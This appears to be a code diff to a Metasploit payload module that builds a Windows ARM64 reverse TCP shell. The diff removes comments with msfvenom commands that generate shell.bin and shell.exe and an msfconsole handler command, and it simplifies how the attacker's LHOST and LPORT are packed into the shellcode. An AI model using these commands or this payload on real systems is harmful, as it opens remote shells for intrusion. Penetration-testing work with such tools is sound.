@@ -2,16 +2,6 @@
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-#
-# Drop this file at:
-#   modules/payloads/singles/windows/aarch64/shell_reverse_tcp.rb
-# inside your metasploit-framework clone, then:
-#   ./msfvenom -p windows/aarch64/shell_reverse_tcp LHOST=... LPORT=... -f raw  -o shell.bin
-#   ./msfvenom -p windows/aarch64/shell_reverse_tcp LHOST=... LPORT=... -f exe  -o shell.exe
-#   ./msfconsole -q -x "use exploit/multi/handler; \
-#                       set payload windows/aarch64/shell_reverse_tcp; \
-#                       set LHOST ...; set LPORT ...; run"
-##
 
 module MetasploitModule
   CachedSize = 664
@@ -52,34 +42,17 @@ module MetasploitModule
   end
 
   def generate(_opts = {})
-    # Fall back to placeholders when datastore isn't populated yet -- the
-    # framework calls generate() from `size` during `show info` / module
-    # discovery, well before the user sets LHOST/LPORT. Raising here would
-    # break those flows. msfvenom always populates the datastore from CLI
-    # flags before invoking generate, so real use is unaffected.
-    lhost = datastore['LHOST']
-    lhost = '127.0.0.1' if lhost.nil? || lhost.to_s.empty?
-
-    lport = datastore['LPORT'].to_i
-    lport = 4444 unless (1..65535).cover?(lport)
-
-    ip_bytes = Rex::Socket.addr_aton(lhost)
-    unless ip_bytes && ip_bytes.bytesize == 4
-      # Hostname resolved to non-IPv4 (or resolve failed). Fall back to
-      # loopback so size calc still works; msfvenom will error elsewhere
-      # if the user really tried to use a bad LHOST.
-      ip_bytes = Rex::Socket.addr_aton('127.0.0.1')
-    end
+    ip_bytes = Rex::Socket.addr_aton(datastore['LHOST'])
 
     # Map LHOST/LPORT onto the MOVK immediates inside fill_sockaddr_fast.
     # sin_port:  network-order bytes loaded as a little-endian 16-bit imm.
     # sin_addr:  octets 0..1 -> low halfword, octets 2..3 -> high halfword.
-    port_imm = [lport].pack('n').unpack1('v')
+    port_imm = [datastore['LPORT'].to_i].pack('n').unpack1('v')
     ip_lo_imm = ip_bytes[0, 2].unpack1('v')
     ip_hi_imm = ip_bytes[2, 2].unpack1('v')
 
-    # Pick the EXITFUNC dispatcher hash. The exitfunk block in the asm
-    # re-resolves the chosen kernel32 export by hash at runtime.
+    # The exitfunk block re-resolves the chosen kernel32 exit API by hash
+    # at runtime; we patch the two MOVZ/MOVK immediates with the hash.
     exit_hash = exitfunk_hash(datastore['EXITFUNC'])
 
     asm = build_asm(
